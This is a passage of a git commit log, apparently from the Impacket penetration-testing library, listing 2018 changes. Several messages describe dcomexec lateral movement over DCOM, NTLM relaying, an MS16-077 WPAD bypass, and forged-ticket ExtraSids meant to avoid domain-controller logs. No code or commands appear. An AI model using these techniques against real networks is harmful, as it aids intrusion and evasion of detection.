    Changes to make it run on Python36
    
    * Basic test cases passing in Python36. Just a start.
    * Functionality in Python 27 not affected :)

commit 5261c5bbdc71e58c5ed2f83bcb842ab88e11be61
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 15:38:21 2018 -0500

    Initial secretsdump test cases
    
    * Right now just checks user/pwd with VSS method enabled

commit cd711636e45aac39a732c12a43202758382ce825
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 14:34:13 2018 -0500

    We're not installing test cases anymore.
    
    * If you want to test the library, git checkout it and run the tests from the checked out repo

commit 7a8acdddfb5a3b459c05f26d6784b7d8acf31fcd
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 13:43:32 2018 -0500

    Fixed testcases

commit f6ecef0ddaaa99188a725f1ecd86077fe2704f9a
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 13:42:47 2018 -0500

    If you run runall.sh manually it will not collect coverage data. Meant to be a faster way to launch the test cases

commit 2bd682a42018223c1ae7e6e35e25528080477f0a
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 13:34:26 2018 -0500

    Tox and coverage support
    
    Now tox/coverage support should work. Just run tox from the main impacket directory and it should run all the test cases (you still need to complete all the parameters in tests/SMB_RPC/dcetests.cfg)
    It will create a test/htmlcov directory, browse the index.html file to get all the coverage stats. Right now we're at 64+% in coveragefor the whole library. Not bad and there are a quick easy wins there.
    Testing and tweaking needed!

commit ac0fba24c3190944aae2f433ea8e8ee4293513a0
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 11 10:42:17 2018 -0500

    Deleted

commit fbe9b1b046068f19a6b7c9a9751990f51185310b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 9 20:38:32 2018 -0500

    Adding tox support for faster testing. Will make things easier when adding Python3 support
    
    * Check tox.ini in case you need to change something
    * Don't forget to edit/configure tests/SMB_RPC/dcetests.cfg for all the SMB_RPC test cases
    * Still need to analyze code coverage

commit 9b9af33f097a0a7f8532b93345aa81a319a6c2a6
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 9 15:58:38 2018 -0500

    Restoring this file wrongly deleted

commit 920ec9e576a55d64805111dd88cf302b5e761e14
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 9 15:14:44 2018 -0500

    Removing for now

commit 7214ddd11f6fc627b4abf3165d695497e0ed1172
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 23:12:29 2018 -0500

    Removing unnecesary files

commit 0f6f592ea3c065753cc2c03f9cd002ff29ea9300
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 23:06:58 2018 -0500

    Moving test cases to root directory

commit 76ffdaa1ef5595a2ab855552fa643d09f318af42
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 23:06:11 2018 -0500

    Moving to a different path

commit ca26bdd1cc35543518e9403b5bd16178a5493cd0
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 23:03:50 2018 -0500

    Changing requirements related files

commit f06107ba2829af4caf765d58e918010bb3e9458a
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 22:12:45 2018 -0500

    Changed verbosity

commit 647206c2019035a323849419b8b627679b2a313e
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 22:12:25 2018 -0500

    Changed verbosity

commit 140f356e7cb942a8e9b367f0045bfcd55b5698d0
Author: asolino <bethus@gmail.com>
Date:   Sun Apr 8 13:48:50 2018 -0300

    Updated Python versions supported

commit 52a324f28a09c81571bddf3cada78a3703292a7b
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 6 18:27:34 2018 -0300

    Adding the exception data to the debug log produced

commit 7d608797073b7e31e1cd1ac54c91076be0d973eb
Merge: cee6e985 ee3e38f3
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 4 12:35:59 2018 -0300

    Merge branch 'TheNaterz-master'

commit ee3e38f3eb74e833727d8278d0c3d528fa19df82
Merge: cee6e985 824b57f6
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 4 12:34:15 2018 -0300

    Merge branch 'master' of https://github.com/TheNaterz/impacket into TheNaterz-master

commit cee6e9854d64b1d5a5670b0bc348b2aa3fd6aaa7
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 4 12:22:35 2018 -0300

    Updated the LSA Secret's Cached Domain Credentials record.
    
    * Thanks @gentilkiwi for figuring out most of the fields
    * Still some things to figure out there, especially when records are not encrypted (looks like it's just blank data)

commit d133648825a10f05b3683e49687026746ee7452f
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 3 17:03:15 2018 -0300

    Forgot to enable a missing test_case

commit 8e580a4bf2e8e3c4600107332b98be66a101184d
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 3 16:36:38 2018 -0300

    Adding [MS-BKRP] Interface implementation + test cases
    
    * Most of the use cases working (e.g. wrapping and unwrapping server-side).
    * Left ToDo is 2.2.2 Client-Side-Wrapped Secret

commit 824b57f69821ba8409d9292e2b413427d2ccb0a0
Author: TheNaterz <nate.caroe@risksense.com>
Date:   Tue Apr 3 11:18:47 2018 -0600

    added bootkey option

commit 27dc1c93dced27173ef11285da2222f81b6f018f
Author: Matan Hart <me@matanhart.com>
Date:   Tue Apr 3 18:36:51 2018 +0300

    Added support for multiple ExtraSids
    
    Hola @asolino!
    I added an option to provide multiple SIDs to be included in the `ExtraSid` field inside the PAC.
    This addition is important to avoid some DC logs (well summarized by @HarmJ0y here - http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/).

commit c2697fdfe33c8fbb7c58f0826844a89e7b7bca39
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Sun Apr 1 09:49:52 2018 +0300

    Update dhcpm.py

commit 6464c143bf0093754a042e04c8fbe7eb488fae5f
Merge: f351c872 7dce6f22
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 29 19:37:23 2018 -0300

    Merge pull request #416 from fox-it/ldaprelayclientfix
    
    Detect LDAP relay errors due to signing and display those

commit 7dce6f2237ec08fe1f287c7cded6e856350ae6cd
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Mar 29 17:43:46 2018 +0200

    Detect LDAP relay errors due to signing and display those

commit 97f4367e05d0d1ac2fb07b6170b6ecd4ce202f77
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Thu Mar 29 18:20:09 2018 +0300

    Added some dhcpsrv2 function implementation and bug fix
    
    Hi,
    I added implementations for some more functions in dhcpsrv2 interface (such as DhcpEnumSubnetElementsV5,  DhcpEnumSubnetClientsV5 and DhcpGetOptionValueV5).
    Plus there was a bug DHCP_ALL_OPTION_VALUES was declared twice for different objects, so I changed one of them to DHCP_ALL_OPTIONS_VALUES.

commit f351c87244643879521a829c7d49a670bddf3530
Merge: 0d1034c8 079b9572
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 16 10:55:12 2018 -0300

    Merge branch 'luzpaz-misc-typos'

commit 079b9572dc05ef62f7cc0a9986b8823cc4c5e61b
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 16 10:54:55 2018 -0300

    Fix typo

commit 9e7d88b74cacfdcbdc78b5a7191e87e6d01c4483
Author: luz.paz <luzpaz@users.noreply.github.com>
Date:   Fri Mar 16 09:43:26 2018 -0400

    source typo fix

commit 0e96b60b92feed0ac7a85c560e9fa8af0da20e33
Author: luz.paz <luzpaz@users.noreply.github.com>
Date:   Fri Mar 16 09:42:21 2018 -0400

    Misc. typos
    
    Found via `codespell -q 3 -I ../impacket-word-whitelist.txt` through downstream `curl`

commit 0d1034c8c710af9d0b4cad0af92a2a47bcdf9d77
Merge: d88c0f38 7541eed0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 12 11:04:10 2018 -0300

    Merge pull request #408 from xambroz/unshabang
    
    Removing unnecessary shabangs

commit d88c0f3816198126fe62ba8c74020b2c3d4f918a
Merge: e0af5bbf c39c942a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 12 10:59:53 2018 -0300

    Merge pull request #405 from xambroz/os_ident
    
    Moving os_ident to impacket.examples

commit 7541eed045eb5e7930f4f4d494c5b6baef91e5c0
Author: Michal Ambroz <xambroz@users.noreply.github.com>
Date:   Sun Mar 11 17:29:11 2018 +0100

    Removing unnecessary shabangs for scripts which are meant to be modules
    for including, but not for direct execution.

commit c39c942a51e542ff83449c0a9abbd70673c0d376
Author: Michal Ambroz <xambroz@users.noreply.github.com>
Date:   Sun Mar 11 12:57:54 2018 +0100

    Moving os_ident to impacket.examples

commit e0af5bbf8d2ccd7c011d01ed112d6824a6161e93
Merge: 06d29f26 ae24770c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 8 17:03:25 2018 -0300

    Merge pull request #402 from CoreSecurity/byt3bl33d3r-shellbrowserexec
    
    Byt3bl33d3r shellbrowserexec -> dcomexec.py

commit ae24770c5ae949561bce8736ae4ab8b59e505a67
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 8 16:57:57 2018 -0300

    Minor change in description

commit bb741908eeba9c9001cb4d3c7f0c095fad184b89
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 8 16:56:27 2018 -0300

    Deprecated. Replaced by dcomexec.py -object MMC20

commit 06d29f263d603adf302c163f0e4fb68ae4cd6fdb
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 7 19:14:19 2018 -0300

    Reliability improvements in IMAP/IMAPS socks proxy
    
    * Sending and received mails (proxying IMAP/SMTP) seems to work most of the times
    * Still some situations when the relay connection is lost (we don't want that), for example when
    proxying IMAPS/STMP, sending an email, send quitting thunderbird, then restarting. More research needed

commit 750b7b8945ceedab98e9e61bb1f0f70bfd39c571
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 7 11:52:26 2018 -0300

    Bumping dev release to 0.9.17-dev. There won't be a 0.9.16 release.
    
    * Given the change in the installation process, it is better to have a new version dev version just to be
    sure impacket is installed with the latest bits.

commit 882caa046809fe269edf3a0031ed359d6767df7a
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 6 16:54:13 2018 -0300

    Renamed and joined with mmcexec.py, now called dcomexec.py
    
    A similar approach to psexec but executing commands through DCOM.
    You can select different objects to be used to execute the commands.
    Currently supported objects are:
       1. MMC20.Application (49B2791A-B1AE-4C90-9B8E-E860BA07F889) - Tested Windows 7, Windows 10, Server 2012R2
       2. ShellWindows (9BA05972-F6A8-11CF-A442-00A0C90A8F39) - Tested Windows 7, Windows 10, Server 2012R2
       3. ShellBrowserWindow (C08AFD90-F2A1-11D1-8455-00A0C91F3880) - Tested Windows 10, Server 2012R2
    
    Drawback is it needs DCOM, hence, I have to be able to access DCOM ports at the target machine.
    
    Original discovery by Matt Nelson (@enigma0x3):
    https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
    https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/

commit 3aa8fdcab157cefb214fe1c9c1cade13822e49d3
Merge: f0960ee0 223001aa
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 6 12:27:24 2018 -0300

    Merge branch 'shellbrowserexec' of https://github.com/byt3bl33d3r/impacket into byt3bl33d3r-shellbrowserexec

commit f0960ee064eb27bf4b87445979dcabdb0a48d87c
Author: asolino <bethus@gmail.com>
Date:   Sun Mar 4 12:12:10 2018 -0300

    Reliability fixes
    
    1. Remove active socks relay if 'Invalid argument' exception is raised
    2. httprelayserver: if protocol client is not found, abort
    3. smtp/imap relay clients: if keep alive fails, remove it from the relay list, don't catch the exception

commit 223001aad01b5a2dccd0a14c46356abe2d373a68
Author: byt3bl33d3r <byt3bl33d3r@protonmail.com>
Date:   Fri Mar 2 22:22:20 2018 -0700

    Derp2

commit 9bc07957efe8e366e15250d69ea012f4acad45b3
Author: byt3bl33d3r <byt3bl33d3r@protonmail.com>
Date:   Fri Mar 2 22:17:06 2018 -0700

    Derp

commit cb6e114698e89617dbe0053264a825a74c5044d3
Author: byt3bl33d3r <byt3bl33d3r@protonmail.com>
Date:   Fri Mar 2 22:13:51 2018 -0700

    Added shellbrowserexec example script

commit 8efbc8ede5404ebbc53082a25c0d398398161198
Author: asolino <bethus@gmail.com>
Date:   Fri Mar 2 09:53:57 2018 -0300

    Fixed uninitialized variable exception + traceback print when debug is enabled

commit 068279993b19776ec4cf5b93742f469b1f4025c2
Merge: 511faea9 488e6a1f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 1 09:45:42 2018 -0300

    Merge pull request #399 from bao7uo/master
    
    minor typos

commit 488e6a1f0bbb9e51add5d40e8a06331c893592d3
Author: Paul Taylor <21125224+bao7uo@users.noreply.github.com>
Date:   Wed Feb 28 22:39:15 2018 +0000

    minor typos

commit 511faea94881264fdfa650559858995a934ac283
Merge: a637daba db302a70
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Feb 28 18:56:32 2018 -0300

    Merge pull request #398 from fox-it/relayfixes
    
    Small fixes in ntlmrelayx LDAP relaying

commit a637dabac1d05434cb42b85ba97587e2821473d3
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 28 18:54:41 2018 -0300

    Adjusting install packages and information, including packages needed for examples

commit db302a70ff31d54e2e3a2664119efc28b99b79be
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Feb 28 22:44:24 2018 +0100

    Small fixes in ntlmrelayx LDAP relaying

commit 541706ac39dbee1f99d57b3bf93baf4918e9582a
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 28 17:50:48 2018 -0300

    We don't need to load the plugins until we know we have all the args right

commit d0c357e8f8c00ebbf40935775924dd6862dd124f
Merge: 7ca67ee1 cbb79142
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Feb 28 17:45:34 2018 -0300

    Merge pull request #397 from CoreSecurity/relay-experimental
    
    Relay experimental

commit cbb791427eaec0a20cf6ce0949d0dcf07adf1d8c
Merge: 8cfdf014 7ca67ee1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Feb 27 18:05:15 2018 -0300

    Merge branch 'master' into relay-experimental

commit 7ca67ee18bac23729f07325567a9a6fd34007fac
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 20 19:38:49 2018 -0300

    Get getMachineName() now works even if anonymous login is not allowed
    
    We have enough data already to get the server's name

commit d2c9b366483ba71d83d2bc1dfd75727dd2644356
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 20 19:36:03 2018 -0300

    Trying to increase the likelihood of getting RC4 session tickets.
    
    In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
    password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
    cleartext password.
    If no clear text password is provided, we just go with the defaults.

commit d8698c0c92f383b7fe7a51c095c28aabdca28579
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 13 16:13:15 2018 -0300

    pip packaging dep autoinstall
    
    * Based on @maaaaz feedback.
    * Addresses https://github.com/CoreSecurity/impacket/issues/337

commit f99b53b4512a05a420855e00a082343afb3f8b00
Merge: 1c4b3834 523f7d99
Author: asolino <bethus@gmail.com>
Date:   Sat Feb 10 18:10:00 2018 -0300

    Merge branch 'eyalmamo-fix_nmb_send_bug'

commit 523f7d999b0f36248225a35f943ba1dc01948e36
Author: asolino <bethus@gmail.com>
Date:   Sat Feb 10 18:09:42 2018 -0300

    Replace socket.send() with socket.sendall()

commit d9e316ae89fb20bf092175aec05514ecb6f9ae6a
Merge: 1c4b3834 be0117ab
Author: asolino <bethus@gmail.com>
Date:   Sat Feb 10 17:55:52 2018 -0300

    Merge branch 'fix_nmb_send_bug' of https://github.com/eyalmamo/impacket into eyalmamo-fix_nmb_send_bug

commit 8cfdf014995b8c1a5395f80f1132fdeab49d1311
Merge: 45abb5b5 52564c77
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Feb 9 10:44:50 2018 -0300

    Merge pull request #392 from mohemiv/relay-experimental
    
    Fixed decoding "Chunked transfer encoding"

commit 52564c77666803066f6c6c253e0df3c202be0f8b
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Thu Feb 8 20:33:39 2018 +0300

    Fixed decoding "Chunked transfer encoding"

commit 1c4b38349dca2cf9ff510c4ec425a2ed71a7d4eb
Merge: 4ab9bb1e f2307d25
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Feb 8 09:43:05 2018 -0300

    Merge pull request #391 from donwayo/wmiexec_failures
    
    Wmiexec failures

commit f2307d25781b0abf9160aa5feffbf46c36cb502d
Merge: 541fe407 4ab9bb1e
Author: Donwayo <guayin@gmail.com>
Date:   Thu Feb 8 13:30:44 2018 +0100

    Merge branch 'master' of https://github.com/CoreSecurity/impacket into wmiexec_failures

commit 541fe4072c8825512914d57bf71d5921559d20d0
Author: Donwayo <guayin@gmail.com>
Date:   Thu Feb 8 13:26:51 2018 +0100

    Fixed crash when wmiexec.py fails to get a file.

commit 4ab9bb1edd83de6fedce36619f265ac0e6b178f5
Merge: 84ad443a ff03fbfd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Feb 6 18:12:27 2018 -0300

    Merge pull request #388 from Kayzaks/master
    
    Alternative method to execute cmd's on MSSQL

commit ff03fbfd25330f9dd043bade11627a9fec3e2e0c
Author: Michael Kissner <m1o1d1@gmail.com>
Date:   Tue Feb 6 20:37:07 2018 +0100

    Job set to always delete

commit 84335395b7550fa23d1c7790308454e8ecfafa5d
Author: Michael Kissner <m1o1d1@gmail.com>
Date:   Tue Feb 6 20:20:38 2018 +0100

    Added alternative method to execute cmd's on MSSQL

commit 84ad443a0e227f4c99481effe3041281deeeebce
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 6 12:00:16 2018 -0300

    Adding CIM_ARRAY_OBJECT support when using WMI.
    
    * Now CIM_ARRAY_OBJECTs are parsed and for each item a IWbemClassObject is created
    * Fix in printInformation() so it prints better output and less noise
    * Check #387 for usage

commit b1a8bd84e3ba952406c4e21fdb80bd4a53f096dc
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 5 18:34:37 2018 -0300

    First pass for CIM_TYPE_OBJECT support when using WMI.
    
    * Check https://github.com/CoreSecurity/impacket/issues/387 for usage

commit 28ebe5c296acace3cdd6dec0b9acd53d9c0a56d1
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 5 13:26:28 2018 -0300

    Print traceback if DEBUG is on

commit ec9bab2fad83216f18556486c38a513951c4d666
Merge: 3ea914bd 08fc7378
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Feb 1 09:33:36 2018 -0300

    Merge pull request #384 from derekchentrendmicro/fix_unicode_struct
    
    fix UnicodeStructure of class SMBOpen_Data

commit 08fc737864a7dc1b9446752c1764b5bcb143843a
Author: derekchentrendmicro <derek_chen@trend.com.tw>
Date:   Thu Feb 1 10:46:18 2018 +0800

    fix UnicodeStructure of class SMBOpen_Data
    
    1. 'FileName' should be Unicode. Change 'z' to 'u'.
    2. openFile['Data']['Pad'] is not processed so remove it.

commit 45abb5b5bd1a67e77c58596a5314bf04e78db7f8
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 31 17:07:26 2018 -0300

    Using the SMTPException Exception to catch SMTP keepAlive() errors

commit 80b8e4ad837d99ea711188c2551a79f99c19aa94
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 31 17:00:09 2018 -0300

    keepAlive() refactoring
    
    * Moved from SOCKS plugins to protocolClient
    * The timer is called every impacket.examples.ntlmrelayx.servers.socksserver.KEEP_ALIVE_TIMER seconds
    * The protocolClient.keepAlive() method will be called, and it's up to the method to decide whether or not it is time to send a keep alive to the target. Check the SMB protocolClient for an example.

commit 9f3c6e125ef7c763b894edb6cbd1b0875fb9fc25
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 31 15:28:34 2018 -0300

    Relay servers are now attacks agnostic
    
    * These servers don't handle specifics about the attacks.. it just forwards connections to the available attacks based on a predefined dictionary.
    * In the future we can implement the attacks as plugins similar to the protocolClients/socks plugins.
    * Keep in mind this when coding more servers
    * Testing needed

commit b68c66577d79e1909500672fdb214d28034ac52a
Merge: 95ba1bf6 54b5277d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 31 14:07:01 2018 -0300

    Merge pull request #383 from fox-it/relay-experimental
    
    Compatibility with ldap3==2.4.1, small bugfix in WPAD parsing and requirements updates

commit 54b5277d592895832d6f055179b15c0a617ac70b
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 31 17:12:17 2018 +0100

    Updated requirements and split requirements into library requirements and requirements for the examples

commit c871150e944c143481cc965c822f2c0f82e22cc4
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 31 15:52:43 2018 +0100

    Compatibility with ldap3==2.4.1, small bugfix in WPAD parsing

commit 95ba1bf68f9de5c3818881a92ac94e25b21b4e11
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 30 19:40:57 2018 -0300

    Passing the protocolClient instance to activeConnections Queue (instead of protocolClient.session)
    
    - Needed because we not only need the session itself (for relaying connections) but also the protocolClient that has the killConnection() method. Needed to kill the relayed connection when needed. Why?.. Because depending on the protocolClient session, there might be different methods to call in order to close the client session.
    - This solves this pending ToDo https://github.com/CoreSecurity/impacket/blob/relay-experimental/impacket/examples/ntlmrelayx/servers/socksserver.py#L221 that was preventing the socks server to behave independently of the protocolClient used.

commit 3ea914bde68f473bf94f43d2345f08d383bd71fc
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 25 11:23:55 2018 -0300

    We need to take out the domain (if provided) when building the SPN

commit c61fbb8d6b4f346751777a0d990dfe972a12d6d6
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 25 10:49:08 2018 -0300

    Fixed wrong sname construction

commit 414ef00a2f2431d22e0a8042a7911d94fee92a5e
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 25 10:47:11 2018 -0300

    Fixed Kerberos Principal creation when FQDN is specified as command line

commit aa493da013f8ed993985b46610c90220a7fd68d4
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 25 10:12:44 2018 -0300

    Improved test cases
    
    * Should work better against 2012 DCs

commit 4de5171c062a1c3a0355360d70c9c05138d5680d
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 24 19:00:55 2018 -0300

    When anySPN is True, return a suitable TGT/ST *without* checking the SPN's port number

commit 7de02244bf4c8c4beaf24a321b6529f759a0ae25
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 23 18:20:30 2018 -0300

    Added the Authenticated attribute inside the connection ID
    
    * It should kick users' off if they try to execute commands that are not allowed if you're not authenticated
    * Authentication (including signing) should now work for SMB1/SMB2

commit fffb62114699c22b12a3b3446665cac978e16371
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 22 16:48:49 2018 -0300

    Added a last check for ccache Session Tickets lookup
    
    - If no ST was found, we look for the instance name based on the destination port, and we try the SPN with the instance name.
    - Thanks @bransh for the updates.

commit 46dfdcf680e356d5bff92f7712941b26532b54d2
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 22 12:34:06 2018 -0300

    Adding domain to the principal name when search for a service ticket in the cache

commit 58c2aecfad1c6eac6deda0061c139c5f54d60b57
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 18:28:01 2018 -0300

    Copyright updated

commit f6db45b2bb9218b041fd85c0af8cec5eb1977b44
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 18:21:07 2018 -0300

    Printing domain SID when running
    
    * Useful for other tools (e.g. ticketer.py)

commit 811d715525494f017bf0e858ceba93fe085c622c
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 18:10:20 2018 -0300

    We want the server to include the target port as well
    
    * Important when writing service tickets that needs the port specified (e.g. MSSQLSvc)

commit 0c9332f84099f7bfb7ac6e613f18a52ff709af22
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 17:58:26 2018 -0300

    Extra verification to check whether or not we have a TGT/TGS available in cache

commit 7ed3fdcf05e629902e61956de080d95b16926891
Merge: 5813a5f4 cf84ee5e
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 16:52:01 2018 -0300

    Merge branch 'machosec-patch-5'

commit cf84ee5e4d1382bd765c78b6dd9a0ed3186b9d72
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 16:50:12 2018 -0300

    ASN1 encoding errors fixed
    
    * Fixes by @bransh / @br4nsh. Now everything seems to be working

commit 87cebb4b07e8844e78e1c9ace335ca34630583af
Merge: 5813a5f4 f3745471
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 20 16:38:15 2018 -0300

    Merge branch 'patch-5' of https://github.com/machosec/impacket into machosec-patch-5

commit 5813a5f4527460b9c9b87175f528d5d366e0436b
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 18 09:12:10 2018 -0300

    __str__ should return the encoded blob, not its length
    
    * Fixes https://github.com/CoreSecurity/impacket/issues/376

commit 5c1d9945c1eee0d0d23fb7d5512ff7821633d1ff
Merge: d57af783 3ba1a36e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 16 10:26:33 2018 -0300

    Merge pull request #374 from arch4ngel/smbserver_interface_specification
    
    patching smbserver.py for ip specification

commit 3ba1a36e39cc1f07e4f4d3063fc53f5d85bd55b7
Author: arch4ngel <justinangel86@gmail.com>
Date:   Mon Jan 15 20:48:49 2018 -0500

    patching smbserver.py for ip specification

commit 9386c590be76b1ec7584c8132e334170a043611e
Merge: 3278ee41 fd9196b0
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 12 12:31:14 2018 -0300

    Merge branch 'mohemiv-relay-experimental' into relay-experimental

commit fd9196b0d3925eb0a520658ccb0bc1d69d7b154b
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Fri Jan 12 11:59:58 2018 +0300

    Added SOCKS4a support

commit d57af7835f9f3192988d1c99d9a1b549000cf37e
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 11 10:09:07 2018 -0300

    Happy new year

commit 3278ee4147353f6c2b0b3d733ccea477da842f65
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 11 10:08:32 2018 -0300

    Happy new year

commit e64336cb697bd22a24badbe06ee3dd1a06f72319
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 11 09:16:39 2018 -0300

    Properly decode AUTHENTICATE_MESSAGE contents based on the encoding set
    
    * Addresses https://github.com/CoreSecurity/impacket/issues/368

commit c4e48bf3168aef2b8922c58cc979e65c294bbd0d
Merge: f8830bfa cc4b5e45
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 10 19:10:27 2018 -0300

    Merge pull request #370 from fox-it/mitm6-re
    
    IPv6 compatibility and WPAD serving for MS16-077 bypass

commit b6a604442c5c2091b4963ea687ce71afdcc28d76
Merge: 093f8856 d347ffa6
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 10 18:11:55 2018 -0300

    Merge pull request #369 from fox-it/mitm6-m
    
    IPv6 compatibility and WPAD serving for MS16-077 bypass

commit d347ffa6eb83a47af259ad1ce9ac11014e92e0fd
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 10 21:46:52 2018 +0100

    IPv6 compatibility and WPAD serving for MS16-077 bypass

commit cc4b5e457516f7f1487c6d15bc655ebd3fe15202
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Wed Jan 10 21:12:20 2018 +0100

    IPv6 compatibility and WPAD serving for MS16-077 bypass

commit f8830bfae2478baffc414870392b8edbd8cfb24e
Merge: 4fd786dc 5b878691
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:46:47 2018 -0300

    Merge branch 'fox-it-relay-experimental' into relay-experimental

commit 5b8786915c9a078b786fb65066d297f2f3be37d6
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:41:26 2018 -0300

    LOG must be used only inside the library files.
    
    * Examples should use logging directly.

commit 093f8856c4914ac661bfbae803fd1a7b0d335e9e
Merge: cf03ace5 47a3b9fd
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:35:40 2018 -0300

    Merge branch 'Ramzeth-master'

commit 47a3b9fd19e4823ca3b9cab4612a9e7a3f46a970
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:35:06 2018 -0300

    Adding debug info for LSA and preventing exception when OldVal not present

commit 4d1b432ae42f2076aa3231251137cd70d3ad2e4b
Merge: cf03ace5 d2736eff
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 9 20:15:46 2018 -0300

    Merge branch 'master' of https://github.com/Ramzeth/impacket into Ramzeth-master

commit cf03ace5e70d77d395a1b6b189222036ac379230
Merge: b579cfc6 90c9908a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 9 20:14:09 2018 -0300

    Merge pull request #367 from arch4ngel/ntlmrelayx_interface_specification
    
    Update ntlmrelayx to support IP address specification

commit 90c9908a861ee958d07d4ed478821cf0f2475a11
Author: root <root@fuzzjessiex64>
Date:   Mon Jan 8 12:03:44 2018 -0500

    Initial configuration to support specification of interface addresses when using ntlmrelayx.py

commit b579cfc6e1ddca43f64c0adb1e434d1006cc612b
Author: asolino <bethus@gmail.com>
Date:   Sun Jan 7 20:39:40 2018 -0300

    Adding support for user/password authentication
    
    * Just call using -user <username> -password <password> (optionally just provide the LM:NT hashes)
    * Signing will be enabled when needed
    * SMBv1/v2 support

commit 0227d6a9550c951961ce611a8ea77a51cf8cbe48
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Jan 5 15:10:52 2018 +0100

    Fixed high CPU by removing redundant loop in connectionwatcher

commit fc92ac3c337cba6ab61d6814abb8a1ae67e2d9d7
